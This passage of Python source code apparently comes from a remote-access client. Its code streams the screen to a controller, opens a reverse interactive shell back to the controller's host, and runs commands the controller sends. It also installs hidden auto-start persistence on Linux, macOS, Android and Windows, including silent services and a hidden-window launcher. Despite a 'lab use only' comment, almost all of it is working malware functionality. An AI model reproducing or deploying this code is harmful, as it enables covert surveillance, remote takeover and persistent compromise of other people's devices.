            [exe, 'call', '--session', '--dest', 'org.gnome.Shell.Screenshot',
             '--object-path', '/org/gnome/Shell/Screenshot', '--method',
             'org.gnome.Shell.Screenshot.Screenshot', 'false', 'false'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
        if proc.returncode != 0:
            detail = proc.stderr.decode('utf-8', 'replace').strip()
            raise RuntimeError(detail.splitlines()[-1] if detail else
                               'exit status {}'.format(proc.returncode))
        out = proc.stdout.decode('utf-8', 'replace').strip()
        match = re.search(r"'([^']+)'", out)
        if not out.startswith('(true') or match is None:
            raise RuntimeError('refused: {}'.format(out[:160] or 'no reply'))
        path = match.group(1)
        try:
            with open(path, 'rb') as f:
                data = f.read()
        finally:
            with contextlib.suppress(OSError):
                os.remove(path)
        return _load(data)

    wayland = sys.platform.startswith('linux') and (
        os.environ.get('XDG_SESSION_TYPE', '').lower() == 'wayland'
        or bool(os.environ.get('WAYLAND_DISPLAY')))
    desktop = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()

    # name -> (command line, how the picture comes back)
    helpers = {
        'grim': (['grim', '-t', 'jpeg', '-'], from_stdout),          # wlroots Wayland (Hyprland/Sway)
        'spectacle': (['spectacle', '-b', '-n', '-f', '-o'], from_file),    # KDE Plasma
        'portal': (None, None),       # XDG portal (GNOME Wayland and a generic fallback)
        'gnome_shell': (None, None),  # pre-41 GNOME Shell API
        'magick': (['import', '-window', 'root', 'png:-'], from_stdout),    # ImageMagick (X11)
        'scrot': (['scrot', '-o'], from_file),                       # X11, silent
        'maim': (['maim'], from_file),                               # X11, silent
    }
    # tools whose Wayland output would be XWayland's (blank) root window
    x11_tools = {'Pillow', 'pyautogui', 'magick', 'scrot', 'maim'}

    def capture(name):
        if name == 'Pillow':
            from PIL import ImageGrab
            img = ImageGrab.grab().convert('RGB')
        elif name == 'pyautogui':
            import pyautogui    # NOTE: may sys.exit() on Linux without tkinter
            img = pyautogui.screenshot().convert('RGB')
        elif name == 'screencapture':
            return from_screencapture()
        elif name == 'android':
            return from_android()
        elif name == 'portal':
            return from_portal()
        elif name == 'gnome_shell':
            return from_gnome_shell()
        else:
            cmd, grab = helpers[name]
            img = grab(cmd)
        if wayland and name in x11_tools:
            lo, hi = img.convert('L').getextrema()
            if lo == hi:             # flat picture: not a real capture
                raise RuntimeError('empty XWayland picture (solid colour)')
        return img

    linux = sys.platform.startswith('linux')
    if is_android():
        order = ['android']             # root screencap, or a clear error
    elif is_ios():
        order = ['screencapture', 'Pillow']     # only a jailbreak has a capture tool
    elif is_macos():
        order = ['Pillow', 'screencapture', 'pyautogui']
    elif wayland:
        # Wayland: the desktop's own tool is the only real option (Pillow
        # would only see XWayland), so keep the old order there.
        if 'kde' in desktop or 'plasma' in desktop:
            order = ['spectacle', 'portal', 'grim']
        elif 'gnome' in desktop:
            order = ['portal', 'gnome_shell', 'grim']
        else:                        # Hyprland, Sway, ...
            order = ['grim', 'spectacle', 'portal', 'gnome_shell']
        order += ['magick', 'Pillow', 'scrot', 'maim']
    elif linux:
        # X11: Pillow first again (instant and silent, exactly like before);
        # only quiet tools follow - none of them can open a window.
        order = ['Pillow', 'pyautogui', 'magick', 'scrot', 'maim']
    else:
        # Windows: Pillow, with pyautogui as the only backup
        order = ['Pillow', 'pyautogui']
    order = list(dict.fromkeys(order))

    errors = []
    for name in order:
        try:
            return capture(name)
        except BaseException as e:
            if isinstance(e, FileNotFoundError):
                detail = 'not installed (not found in PATH)'
            else:
                detail = str(e)
            errors.append('{}: {}'.format(name, detail))

    if is_android():
        hint = ('Android: screen capture needs root (su + /system/bin/screencap); '
                'stock Android blocks it. Install Pillow for conversion with '
                'pkg install python-pillow.')
    elif is_ios():
        hint = ('iOS: stock iOS does not allow screen capture from a Python app. '
                'Only a jailbroken device with a screencapture tool can do it.')
    elif is_macos():
        hint = ('macOS: python3 -m pip install --user pillow; grant Screen Recording '
                'to your terminal in System Settings > Privacy & Security, then '
                'restart it. The built-in screencapture command is a fallback.')
    elif wayland:
        hint = ('Wayland: install the desktop helper (grim on Hyprland/Sway, '
                'kde-spectacle on KDE) or enable the desktop portal; on GNOME '
                'install python3-gi (Debian/Ubuntu) or python3-gobject (Fedora). '
                'X11 tools only see XWayland and cannot capture the real screen.')
    else:
        hint = ('Windows: py -m pip install pillow; Debian/Kali/Mint: sudo apt install '
                'python3-pil; Fedora: sudo dnf install python3-pillow; Arch: '
                'sudo pacman -S python-pillow grim')
    raise CaptureError('no screen capture available ({}). {}'.format(
        ' | '.join(errors), hint), errors)


def _send_frame(conn, jpeg):
    """Write one JPEG frame ('\\x01' marks it as a frame, not JSON)."""
    payload = b'\x01' + jpeg
    with SEND_LOCK:
        _send_chunked(conn, len(payload).to_bytes(4, 'big'))
        _send_chunked(conn, payload)


def stream_screen(conn, fps=None, stop_event=None, req_id=None):
    """Capture this machine's screen and stream it to the controller as JPEG
    frames until stop_event is set or the connection breaks.

    This runs in its own thread, so the controller can keep sending commands
    while the screen is shared (that is what its Ctrl+B/'jobs' feature is for).
    The final message carries the id of the request that started the stream,
    so the controller knows exactly which operation ended."""
    interval = None
    if fps:
        try:
            value = float(fps)                  # "2.5" is valid, not just "2"
            interval = 1.0 / max(1.0, min(value, 60.0))
        except (TypeError, ValueError):
            interval = None

    failed = False
    while stop_event is None or not stop_event.is_set():
        start = time.time()
        try:
            img = grab_screen()
            img = img.resize(SCREEN_SIZE)                 # PIL resize: (width, height)
            buf = io.BytesIO()
            img.save(buf, 'JPEG', quality=SCREEN_JPEG_QUALITY)
        except Exception as e:
            send_msg(conn, {'type': 'error', 'id': req_id,
                            'data': 'screenshot failed: {}'.format(e),
                            'diag': _capture_diag(e)})
            failed = True
            break

        _send_frame(conn, buf.getvalue())                 # OSError -> reconnect

        if interval:
            elapsed = time.time() - start
            if elapsed < interval:
                time.sleep(interval - elapsed)

    if not failed:
        send_msg(conn, {'type': 'output', 'id': req_id,
                        'data': '[client] screen share stopped'})


STREAM_LOCK = threading.Lock()
STREAM = {'thread': None, 'stop': None, 'id': None}


def stream_running():
    with STREAM_LOCK:
        thread = STREAM['thread']
        return thread is not None and thread.is_alive()


def stop_stream(wait=1.5):
    """Ask a running screen share to finish (it sends the closing message).
    Returns False when nothing was streaming."""
    with STREAM_LOCK:
        stop_event = STREAM['stop']
        thread = STREAM['thread']
    if stop_event is None:
        return False
    stop_event.set()
    if (thread is not None and thread.ident is not None
            and thread is not threading.current_thread()):
        thread.join(wait)               # give it a moment to send the closing note
    return True


def _stream_worker(conn, fps, stop_event, req_id):
    """Thread body for one screen share."""
    try:
        stream_screen(conn, fps, stop_event, req_id)
    except Exception as e:
        print('[!] screen share stopped: {}'.format(e))
    finally:
        with STREAM_LOCK:
            if STREAM['thread'] is threading.current_thread():
                STREAM['thread'] = None
                STREAM['stop'] = None
                STREAM['id'] = None


def take_screenshot(conn, req_id=None):
    """Send one full-resolution screenshot as a JPEG image."""
    try:
        img = grab_screen()
        buf = io.BytesIO()
        img.save(buf, 'JPEG', quality=SCREENSHOT_JPEG_QUALITY)
    except Exception as e:
        send_msg(conn, {'type': 'error', 'id': req_id,
                        'data': 'screenshot failed: {}'.format(e),
                        'diag': _capture_diag(e)})
        return
    send_msg(conn, {'type': 'image', 'id': req_id, 'name': 'screenshot.jpg',
                    'data': base64.b64encode(buf.getvalue()).decode('ascii')})


# ---------------------------------------------------------------------------
# Interactive shell ("shell" command): reverse_shell.py's agent injected
# here. When the controller asks for a shell, it opens a fresh port and we
# connect back to it and bridge a real PTY (Unix) or winpty (Windows) until
# the session ends. The main command connection keeps working meanwhile.
# ---------------------------------------------------------------------------

SHELL_CONNECT_TIMEOUT = 10      # seconds to keep retrying the controller's shell port
SHELL_HANDSHAKE_TIMEOUT = 10    # seconds to wait for the terminal-size handshake
SHELL_BUSY = threading.Lock()   # one interactive shell at a time
SHELL_SOCK = [None]             # current shell socket, so reconnect/exit can stop it
SHELL_THREAD = [None]           # its worker thread
SHELL_LOCK = threading.Lock()


def stop_shell(wait=1.0):
    """Stop an interactive shell that belonged to a gone controller.

    Without this, the old shell could keep SHELL_BUSY forever and the next
    'shell' request after a reconnect was refused as 'already running'."""
    with SHELL_LOCK:
        sock, thread = SHELL_SOCK[0], SHELL_THREAD[0]
    if sock is None:
        return False
    try:
        sock.shutdown(socket.SHUT_RDWR)     # wakes select() in the bridge
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass
    if (thread is not None and thread.ident is not None
            and thread is not threading.current_thread()):
        thread.join(wait)
    return True


def _recv_exact(sock, n):
    """Read exactly n bytes from a socket (shell handshake)."""
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError('peer closed during handshake')
        buf += chunk
    return buf


def _connect_shell(host, port):
    """Connect to the controller's shell port, retrying briefly so a slow
    accept on the controller side cannot lose the session."""
    deadline = time.time() + SHELL_CONNECT_TIMEOUT
    while True:
        try:
            sock = socket.create_connection((host, port), timeout=5)
        except OSError:
            if time.time() >= deadline:
                raise
            time.sleep(0.25)
            continue
        sock.settimeout(None)
        _tune_socket(sock)
        try:
            sock.set_inheritable(False)     # never leak into the shell child
        except (AttributeError, OSError):
            pass
        return sock


def _pty_write_all(fd, data):
    """os.write() on a PTY master can short-write; loop until done."""
    view = memoryview(data)
    while view:
        view = view[os.write(fd, view):]


def _signal_pty_group(pid, sig):
    """Signal the shell's whole session (children included) when possible."""
    try:
        os.killpg(pid, sig)             # pty.fork() made pid a session leader
        return True
    except ProcessLookupError:
        return False
    except OSError:
        try:
            os.kill(pid, sig)
            return True
        except OSError:
            return False


def _reap_pty_child(pid, grace=2.0):
    """Stop and reap a PTY shell without ever blocking the client forever.

    The old code did a blocking waitpid(): a shell that ignored SIGTERM (or a
    stopped child) could hang the shell thread, and with it SHELL_BUSY, until
    the whole client was killed. Now: SIGHUP, a bounded WNOHANG wait, then
    SIGKILL, then one more short bounded wait."""
    deadline = time.time() + grace
    for sig in (signal.SIGHUP, signal.SIGKILL):
        _signal_pty_group(pid, sig)
        while time.time() < deadline:
            try:
                done, _ = os.waitpid(pid, os.WNOHANG)
            except ChildProcessError:
                return
            except OSError:
                return
            if done:
                return
            time.sleep(0.05)
        deadline = time.time() + 1.0


def _shell_unix(sock, rows, cols):
    """Bridge a real interactive shell (PTY) to the controller's socket."""
    import fcntl
    import pty
    import signal
    import termios

    pid, master_fd = pty.fork()
    if pid == 0:
        # Child: drop the socket, make the PTY a sane terminal, exec a shell.
        try:
            os.close(sock.fileno())
        except OSError:
            pass
        try:
            attrs = termios.tcgetattr(0)
            attrs[0] |= termios.ICRNL
            attrs[3] |= termios.ICANON | termios.ECHO | termios.ISIG
            termios.tcsetattr(0, termios.TCSANOW, attrs)
        except Exception:
            pass
        shell = _shell_executable() or os.environ.get('SHELL') or '/bin/bash'
        if not os.path.exists(shell):
            shell = '/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
        try:
            os.execvp(shell, [shell, '-i'])
        except OSError:
            # Last resort, and never return into the client's code from this
            # forked child (that would duplicate the whole process).
            try:
                os.execvp('/bin/sh', ['/bin/sh', '-i'])
            except OSError:
                pass
        os._exit(1)

    if rows > 0 and cols > 0:
        try:
            fcntl.ioctl(master_fd, termios.TIOCSWINSZ,
                        struct.pack('HHHH', rows, cols, 0, 0))
        except OSError:
            pass

    try:
        while True:
            readable, _, _ = select.select([sock, master_fd], [], [])
            if sock in readable:
                data = sock.recv(65536)
                if not data:
                    break
                try:
                    _pty_write_all(master_fd, data)
                except OSError:
                    break               # shell exited, PTY master closed
            if master_fd in readable:
                try:
                    data = os.read(master_fd, 65536)
                except OSError as e:
                    if e.errno == errno.EIO:
                        break           # Linux: EIO == EOF when the slave closes
                    raise
                if not data:
                    break
                try:
                    sock.sendall(data)
                except OSError:
                    break
    finally:
        try:
            os.close(master_fd)         # closing first makes the shell see EOF/HUP
        except OSError:
            pass
        _reap_pty_child(pid)            # bounded: never blocks forever on a stuck shell


def _shell_windows(sock, rows, cols):
    """Bridge a PowerShell/cmd console (winpty) to the controller's socket."""
    try:
        import winpty                   # pywinpty >= 3.0.5: pip install pywinpty
    except ImportError:
        print('[!] pywinpty is not installed - using the pipe fallback.')
        _shell_windows_pipes(sock)
        return

    shell = 'powershell.exe' if shutil.which('powershell.exe') else 'cmd.exe'
    pty = winpty.PtyProcess.spawn(shell, dimensions=(rows, cols))

    stop = threading.Event()

    def reader():
        try:
            while not stop.is_set():
                data = pty.read()       # returns str (Unicode) in pywinpty v3+
                if not data:            # None or empty -> EOF
                    break
                if isinstance(data, str):
                    data = data.encode('utf-8', 'replace')
                sock.sendall(data)
        except Exception:
            pass
        finally:
            stop.set()

    threading.Thread(target=reader, daemon=True).start()

    try:
        while not stop.is_set():
            readable, _, _ = select.select([sock], [], [], 0.2)
            if not readable:
                continue                        # lets us notice shell exit
            data = sock.recv(65536)
            if not data:
                break
            data = re.sub(br'\r(?!\n)', b'\r\n', data)   # lone \r -> \r\n
            pty.write(data.decode('utf-8', 'replace'))
    except (OSError, ConnectionError, EOFError):
        pass
    finally:
        stop.set()
        try:
            pty.terminate()
        except Exception:
            pass


def _shell_windows_pipes(sock):
    """Fallback when pywinpty is unavailable (cmd/powershell via pipes)."""
    shell = 'powershell.exe' if shutil.which('powershell.exe') else 'cmd.exe'
    proc = subprocess.Popen([shell], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, bufsize=0,
                            close_fds=True,          # never inherit socket handles
                            creationflags=CREATE_NO_WINDOW)

    def pump():
        try:
            while True:
                chunk = os.read(proc.stdout.fileno(), 4096)
                if not chunk:
                    break
                sock.sendall(chunk)
        except OSError:
            pass
        finally:
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass

    threading.Thread(target=pump, daemon=True).start()

    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            data = re.sub(br'\r(?!\n)', b'\r\n', data)
            proc.stdin.write(data)
            proc.stdin.flush()
    except (OSError, BrokenPipeError):
        pass
    finally:
        try:
            proc.kill()
        except Exception:
            pass


def _interactive_shell_thread(host, port):
    """Background worker: run one interactive shell session for the controller."""
    sock = None
    try:
        try:
            sock = _connect_shell(host, port)
        except OSError as e:
            print('[!] shell: could not reach the controller shell port: {}'.format(e))
            return
        with SHELL_LOCK:
            SHELL_SOCK[0] = sock

        try:                            # terminal-size handshake (rows, cols)
            sock.settimeout(SHELL_HANDSHAKE_TIMEOUT)
            rows, cols = struct.unpack('!HH', _recv_exact(sock, 4))
            sock.settimeout(None)
        except Exception as e:
            print('[!] shell: handshake failed: {}'.format(e))
            return
        if rows <= 0 or cols <= 0:
            rows, cols = 24, 80

        print('[+] Interactive shell session started ({}x{}).'.format(rows, cols))
        if os.name == 'nt':
            _shell_windows(sock, rows, cols)
        else:
            _shell_unix(sock, rows, cols)
        print('[+] Interactive shell session ended.')
    except Exception as e:
        print('[!] shell session error: {}'.format(e))
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        with SHELL_LOCK:
            if SHELL_SOCK[0] is sock:
                SHELL_SOCK[0] = None
            if SHELL_THREAD[0] is threading.current_thread():
                SHELL_THREAD[0] = None
        SHELL_BUSY.release()


def start_interactive_shell(control_socket, host, port, req_id=None):
    """Handle a 'shell' request from the controller: one interactive shell,
    in the background, so the main command connection keeps working."""
    if not SHELL_BUSY.acquire(blocking=False):
        send_msg(control_socket, {'type': 'error', 'id': req_id,
                                  'data': 'an interactive shell is already running'})
        return
    try:
        thread = threading.Thread(target=_interactive_shell_thread, args=(host, port),
                                  name='interactive-shell', daemon=True)
        with SHELL_LOCK:
            SHELL_THREAD[0] = thread
        thread.start()
    except Exception as e:
        with SHELL_LOCK:
            SHELL_THREAD[0] = None
        SHELL_BUSY.release()
        send_msg(control_socket, {'type': 'error', 'id': req_id, 'data': 'shell: {}'.format(e)})


# ---------------------------------------------------------------------------
# Command control ("cancel"): commands run in their own process group so
# the controller can stop a long one (Ctrl+Z there) and keep the client alive.
# ---------------------------------------------------------------------------

def _kill_process(proc):
    """Stop a running command, children included."""
    if proc.poll() is not None:
        return
    if os.name == 'nt':
        try:
            result = subprocess.run(['taskkill', '/F', '/T', '/PID', str(proc.pid)],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    timeout=10, creationflags=CREATE_NO_WINDOW)
            if result.returncode == 0:
                return              # taskkill really stopped the tree
        except Exception:
            pass
        # taskkill can fail (access denied, a process that already changed
        # state, ...): kill the direct child as the fallback instead of
        # pretending the command is gone.
        try:
            proc.kill()
        except Exception:
            pass
        return

    try:
        group = os.getpgid(proc.pid)
    except OSError:
        group = None
    for sig, grace in ((signal.SIGTERM, 1.0), (signal.SIGKILL, 2.0)):
        try:
            if group is not None:
                os.killpg(group, sig)
            else:
                proc.send_signal(sig)
        except OSError:
            return
        try:
            proc.wait(timeout=grace)
            return
        except subprocess.TimeoutExpired:
            continue


def run_command(conn, command, current_dir, req_id=None):
    """Run one shell command and return (output_text, stop).

    The command gets its own session/process group, so the whole tree can be
    killed when the controller sends 'cancel' with this request's id (its
    Ctrl+Z) or when the control connection dies. stop=True means the
    controller asked us to exit. Requests that arrive while the command runs
    are queued (DEFERRED) instead of being dropped, so a background
    operation on the controller side still gets its answer."""
    if os.name == 'nt':
        kwargs = {'creationflags': (subprocess.CREATE_NEW_PROCESS_GROUP
                                    | CREATE_NO_WINDOW)}
    else:
        kwargs = {'start_new_session': True}
        shell_exe = _shell_executable()
        if shell_exe:
            kwargs['executable'] = shell_exe
    try:
        proc = subprocess.Popen(command, shell=True, cwd=current_dir,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                **kwargs)
    except Exception as e:
        return '{}'.format(e), False

    chunks = []
    size = [0]
    last_data = [time.time()]
    reader_done = threading.Event()

    def reader():
        try:
            while True:
                data = os.read(proc.stdout.fileno(), 65536)
                if not data:
                    break
                last_data[0] = time.time()
                if size[0] < MAX_OUTPUT:
                    chunks.append(data)
                    size[0] += len(data)
        except OSError:
            pass
        finally:
            reader_done.set()

    reader_thread = threading.Thread(target=reader, daemon=True)
    reader_thread.start()

    killed = truncated = stop = disconnected = False
    kill_why = 'Ctrl+Z'
    while True:
        if size[0] >= MAX_OUTPUT and not truncated:
            # The command writes faster than any link could carry: stop
            # collecting output (the reader thread keeps draining the pipe, so
            # the command never blocks on it). The command itself keeps running
            # - Ctrl+Z / 'stop' on the controller is what ends it.
            truncated = True
        exited = proc.poll() is not None
        if exited and reader_done.is_set():
            break
        if exited and (time.time() - last_data[0]) > 0.5:
            break       # command gone, but a child still holds stdout open
        # Wait for a control message - or, on POSIX, for the command's output
        # pipe to hit EOF, which happens the instant it exits. That is what
        # makes a short command return immediately instead of waiting for a
        # poll tick (this was a fixed 200 ms cost on every single command).
        if os.name == 'nt':
            watch, timeout = [conn], 0.02        # Windows: sockets only in select
        else:
            watch, timeout = [conn, proc.stdout], 0.2
        readable, _, _ = select.select(watch, [], [], timeout)

        if conn in readable:
            msg = recv_msg(conn)
            if msg is None:                     # controller gone: stop, reconnect
                _kill_process(proc)
                disconnected = True
                break
            mtype = msg.get('type')
            if mtype == 'cancel':
                # Ctrl+Z / 'stop' on the controller: it names the request to stop.
                target = msg.get('id')
                why = msg.get('why') or 'Ctrl+Z'
                if target is None or target == req_id:
                    kill_why = why
                    _kill_process(proc)
                    killed = True
                else:
                    _mark_canceled(target, why)  # a queued request: skip it later
            elif mtype == 'cmd_kill':           # older controller: stop this one
                _kill_process(proc)
                killed = True
            elif mtype == 'screenshare_stop':
                stop_stream(wait=0.5)           # a share can run next to a command
            elif mtype == 'exit':
                _kill_process(proc)
                stop = True
                break
            else:
                # A request sent while this command runs (the controller can
                # have several operations in flight now): answer it once this
                # command is done instead of dropping it - dropping it would
                # leave that operation hanging forever.
                DEFERRED.append(msg)
            continue

        if os.name != 'nt' and proc.stdout in readable:
            time.sleep(0.001)           # output flowing: let the reader drain it
            continue

    reader_thread.join(timeout=1)
    text = b''.join(chunks).decode('utf-8', errors='replace')
    notes = []
    if killed:
        notes.append('[client] command stopped by the controller ({})'.format(kill_why))
    if disconnected:
        notes.append('[client] controller disconnected - command stopped')
    if truncated:
        notes.append('[client] output cut off after {} MB (the command kept running)'.format(
            '{:g}'.format(round(MAX_OUTPUT / (1024.0 * 1024.0), 2))))
    if notes:
        if text and not text.endswith('\n'):
            text += '\n'
        text += '\n'.join(notes)
    return text, stop


# ---------------------------------------------------------------------------
# Auto-start ("persistence"): the client can install itself so it starts
# quietly after a reboot/logon. Based on autorunner.py - lab use only.
# ---------------------------------------------------------------------------

def get_os_info():
    if is_android():
        return android_name()
    if is_ios():
        return ios_name()
    if is_macos():
        return macos_name()
    os_type = platform.system().lower()
    if os_type == 'linux':
        try:
            with open('/etc/os-release') as f:
                info = dict(line.strip().split('=', 1) for line in f if '=' in line)
            return 'Linux ({})'.format(info.get('NAME', 'Generic Linux').strip('"'))
        except OSError:
            return 'Linux (Unknown Distro)'
    if os_type == 'windows':
        # platform.release() still says "10" on Windows 11 (the kernel is
        # 10.0); the build number is the reliable distinction.
        try:
            info = sys.getwindowsversion()
            name = '11' if info.build >= 22000 else '10'
            return 'Windows {} (build {})'.format(name, info.build)
        except Exception:
            return 'Windows {}'.format(platform.release())
    return platform.system()


def is_omarchy():
    if is_android() or is_macos() or is_ios():
        return False
    if platform.system().lower() != 'linux':
        return False
    try:
        with open('/etc/os-release') as f:
            return 'omarchy' in f.read().lower()
    except OSError:
        return False


def _user_manager_running():
    try:
        return os.path.isdir('/run/user/{}/systemd'.format(os.getuid()))
    except AttributeError:
        return False


def run_quiet(cmd):
    """Run a setup command; True when it succeeded (bounded: a wedged
    installer or service tool must not hang the setup report forever)."""
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=30, **_quiet_flags()).returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def _service_body(exec_cmd, silent, log_file, after, wanted, user_line):
    if log_file:
        # systemd needs quotes when the path contains spaces.
        out = 'append:"{}"'.format(os.path.abspath(log_file))
    elif silent:
        out = 'null'
    else:
        out = 'journal'
    after_line = '' if after is None else 'After={}\n'.format(after)
    return (
        "[Unit]\n"
        "Description=Auto-run for {}\n"
        "{}"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "{}ExecStart={}\n"
        "WorkingDirectory={}\n"
        "Restart=on-failure\n"
        "RestartSec=3\n"
        "StandardInput=null\n"
        "StandardOutput={}\n"
        "StandardError={}\n"
        "\n"
        "[Install]\n"
        "WantedBy={}\n"
    ).format(AUTORUN_NAME, after_line, user_line, exec_cmd,
             os.path.dirname(SCRIPT_PATH), out, out, wanted)


def setup_linux(ip, port, silent, log_file):
    if not shutil.which('systemctl'):
        print('[-] systemd is not available on this system.')
        return False

    python = sys.executable or shutil.which('python3') or 'python3'
    exec_cmd = '{} {} {} {}'.format(python, SCRIPT_PATH, ip, port)
    service_name = 'autorun-{}.service'.format(AUTORUN_NAME)

    # Prefer a user service: it starts with the desktop session, so screen
    # capture works after a reboot too. (autorunner.py's Omarchy behaviour,
    # extended to any distro with a running systemd user manager.)
    if is_omarchy() or _user_manager_running():
        svc_dir = os.path.expanduser('~/.config/systemd/user')
        os.makedirs(svc_dir, exist_ok=True)
        if is_omarchy() or run_quiet(['systemctl', '--user', 'is-active', '--quiet',
                                      'graphical-session.target']):
            after = wanted = 'graphical-session.target'
        else:
            # no graphical-session.target on this desktop -> plain login start
            after, wanted = None, 'default.target'
        svc_path = os.path.join(svc_dir, service_name)
        try:
            with open(svc_path, 'w') as f:
                f.write(_service_body(exec_cmd, silent, log_file, after, wanted, ''))
        except OSError as e:
            print('[-] Cannot write service: {}'.format(e))
            return False
        run_quiet(['systemctl', '--user', 'daemon-reload'])
        if not run_quiet(['systemctl', '--user', 'enable', '--now', service_name]):
            print('[-] systemctl --user enable failed.')
            return False
        print('[+] User service: {}'.format(svc_path))
        print('[+] Starts with your session after reboot, no terminal window.')
        return True

    # No user manager (SSH-only / server style box): system service, needs root
    if os.geteuid() != 0:
        print('[-] Need root for a system service: re-run with sudo.')
        return False
    run_user = os.environ.get('SUDO_USER', 'root')
    user_line = '' if run_user == 'root' else 'User={}\n'.format(run_user)
    svc_path = '/etc/systemd/system/{}'.format(service_name)
    try:
        with open(svc_path, 'w') as f:
            f.write(_service_body(exec_cmd, silent, log_file,
                                  'network.target', 'multi-user.target', user_line))
    except OSError as e:
        print('[-] Cannot write service: {}'.format(e))
        return False
    run_quiet(['systemctl', 'daemon-reload'])
    if not run_quiet(['systemctl', 'enable', '--now', service_name]):
        print('[-] systemctl enable failed.')
        return False
    print('[+] System service: {}'.format(svc_path))
    print('[+] Runs at boot with no terminal window.')
    return True


def _macos_label():
    safe = re.sub(r'[^A-Za-z0-9.-]', '-', AUTORUN_NAME) or 'client'
    return 'com.autorun.{}'.format(safe)


def _macos_plist_path():
    return os.path.expanduser('~/Library/LaunchAgents/{}.plist'.format(_macos_label()))


def _macos_plist_bytes(ip, port, log_file):
    """Build the LaunchAgent plist (plistlib handles escaping/paths)."""
    import plistlib
    python = sys.executable or shutil.which('python3') or '/usr/bin/python3'
    log_path = os.path.abspath(log_file) if log_file else os.devnull
    data = {
        'Label': _macos_label(),
        'ProgramArguments': [python, SCRIPT_PATH, str(ip), str(port)],
        'RunAtLoad': True,
        # Restart crashes, but not a clean exit requested from the controller.
        'KeepAlive': {'SuccessfulExit': False},
        'WorkingDirectory': os.path.dirname(SCRIPT_PATH),
        'ProcessType': 'Interactive',
        'StandardOutPath': log_path,
        'StandardErrorPath': log_path,
    }
    return plistlib.dumps(data)


def setup_macos(ip, port, silent, log_file):
    """LaunchAgent in ~/Library/LaunchAgents: starts at login, no window."""
    label = _macos_label()
    plist_path = _macos_plist_path()
    try:
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
        with open(plist_path, 'wb') as f:
            f.write(_macos_plist_bytes(ip, port, log_file))
    except OSError as e:
        print('[-] Cannot write LaunchAgent: {}'.format(e))
        return False

    uid = os.getuid()
    service = 'gui/{}/{}'.format(uid, label)
    run_quiet(['launchctl', 'bootout', service])
    loaded = run_quiet(['launchctl', 'bootstrap', 'gui/{}'.format(uid), plist_path])
    if not loaded:
        loaded = run_quiet(['launchctl', 'load', '-w', plist_path])
    if not loaded:
        print('[-] launchctl could not load the LaunchAgent.')
        print('    Try: launchctl bootstrap gui/{} "{}"'.format(uid, plist_path))
        return False
    run_quiet(['launchctl', 'kickstart', '-k', service])

    print('[+] LaunchAgent: {}'.format(plist_path))
    print('[+] Starts automatically at login; no terminal window.')
    print('[i] The first screenshot may ask for Screen Recording permission:')
    print('    System Settings > Privacy & Security > Screen Recording.')
    if not silent:
        print('[i] macOS LaunchAgents always run in the background (no window).')
    if sys.version_info[:2] < (3, 9):
        print('[!] This Python is old ({}). Install Python 3.9+ from python.org'.format(
            platform.python_version()))
        print('    or Homebrew; the Xcode Command Line Tools Python is not supported.')
    return True


def _android_boot_path():
    return os.path.join(os.path.expanduser('~/.termux/boot'),
                        'autorun-{}.sh'.format(AUTORUN_NAME))


def _android_boot_script(ip, port, log_file):
    """Termux:Boot script. Quoted, absolute paths: boot has a minimal PATH."""
    import shlex
    python = sys.executable or shutil.which('python') or 'python'
    prefix = os.environ.get('PREFIX') or '/data/data/com.termux/files/usr'
    shell = os.path.join(prefix, 'bin', 'sh')
    log_path = (os.path.abspath(log_file) if log_file else
                os.path.expanduser('~/.termux/{}-client.log'.format(AUTORUN_NAME)))
    return (
        '#!{}\n'
        '# Generated by client.py --persist (Termux:Boot).\n'
        'cd {} || cd "$HOME"\n'
        'exec {} {} {} {} >> {} 2>&1\n'
    ).format(shell,
             shlex.quote(os.path.dirname(SCRIPT_PATH)),
             shlex.quote(python), shlex.quote(SCRIPT_PATH),
             shlex.quote(str(ip)), str(port), shlex.quote(log_path))


def setup_android(ip, port, silent, log_file):
    """Termux:Boot entry. Android allows no true daemon without root, so the
    documented Termux rules (boot app + unrestricted battery + wake lock) are
    part of the setup output."""
    path = _android_boot_path()
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(_android_boot_script(ip, port, log_file))
        os.chmod(path, 0o700)
    except OSError as e:
        print('[-] Cannot write boot script: {}'.format(e))
        return False

    print('[+] Boot script: {}'.format(path))
    print('[+] Install Termux:Boot (F-Droid or GitHub), open it once, then reboot.')
    print('[+] Set Termux to Unrestricted: Settings > Apps > Termux > Battery.')
    print('[i] Android 12+: if Android kills it, disable phantom-process trimming')
    print('    (Termux wiki: "Processes are being killed"); a wake lock is held now.')
    print('[i] Android 17+: allow Nearby devices / local network for Termux,')
    print('    otherwise LAN connections to the controller are blocked.')
    print('[i] Screen capture needs root (su + screencap); shell and files work without.')
    print('[i] Prefer the F-Droid/GitHub Termux build; the Play Store build is limited.')
    if not silent:
        print('[i] Termux:Boot always starts the client in the background.')
    return True


def _pythonw_path():
    """Locate pythonw.exe (the GUI-subsystem interpreter = no console window)."""
    exe = sys.executable or ''
    if exe:
        d = os.path.dirname(exe)
        for name in ('pythonw.exe', 'pythonw'):
            cand = os.path.join(d, name)
            if os.path.exists(cand):
                return cand
    for name in ('pythonw.exe', 'pythonw'):
        p = shutil.which(name)
        if p:
            return p
    return None


def _make_vbs(executable, arg_path, extra_args):
    """VBS launcher that starts a process with a hidden window."""
    base = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(), 'AutoRunner')
    os.makedirs(base, exist_ok=True)
    vbs_path = os.path.join(base, 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
    inner = '"{}" "{}"'.format(executable, arg_path)
    if extra_args:
        inner += ' ' + extra_args
